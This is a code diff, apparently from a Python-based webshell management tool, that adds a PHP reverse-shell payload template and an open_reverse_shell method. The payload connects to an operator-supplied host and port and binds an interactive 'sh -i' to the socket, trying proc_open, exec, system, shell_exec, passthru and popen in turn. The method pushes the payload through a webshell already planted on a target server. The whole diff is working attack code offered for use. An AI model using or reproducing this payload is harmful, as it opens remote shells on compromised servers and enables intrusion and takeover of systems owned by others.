@@ -470,6 +470,33 @@ decoder_echo($content);
 """
 )
 
+REVERSE_SHELL = compress_phpcode_template("""
+@session_write_close();
+$host = {host};
+$port = {port};
+if(function_exists("fsockopen") && function_exists("proc_open")) {
+    $sock=fsockopen($host, $port);
+    $proc=proc_open("sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+}else if(function_exists("fsockopen") && function_exists("exec")) {
+    $sock=fsockopen($host, $port);
+    exec("sh -i <&3 >&3 2>&3");
+}else if(function_exists("fsockopen") && function_exists("system")) {
+    $sock=fsockopen($host, $port);
+    system("sh -i <&3 >&3 2>&3");
+}else if(function_exists("fsockopen") && function_exists("shell_exec")) {
+    $sock=fsockopen($host, $port);
+    shell_exec("sh -i <&3 >&3 2>&3");
+}else if(function_exists("fsockopen") && function_exists("passthru")) {
+    $sock=fsockopen($host, $port);
+    passthru("sh -i <&3 >&3 2>&3");
+}else if(function_exists("fsockopen") && function_exists("popen")) {
+    $sock=fsockopen($host, $port);
+    popen("sh -i <&3 >&3 2>&3", "r");
+}else{
+    decoder_echo("WRONG_NO_METHOD");
+}
+""")
+
 PAYLOAD_SESSIONIZE = compress_phpcode_template(
     """
 $b64_part = 'B64_PART';
@@ -1158,6 +1185,16 @@ class PHPWebshellActions(PHPSessionInterface):
             code_b64=string_repr(base64_encode(body)),
         )
         return await self.submit_http(code)
+
+    async def open_reverse_shell(self, host: str, port: int) -> None:
+        code = format_phpcode(
+            REVERSE_SHELL,
+            host=string_repr(host),
+            port=str(port)
+        )
+        result = await self.submit(code)
+        if result == "WRONG_NO_METHOD":
+            raise TargetError("目标打开反弹shell对应的函数")
 
     async def submit(self, payload: str) -> str:
         raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
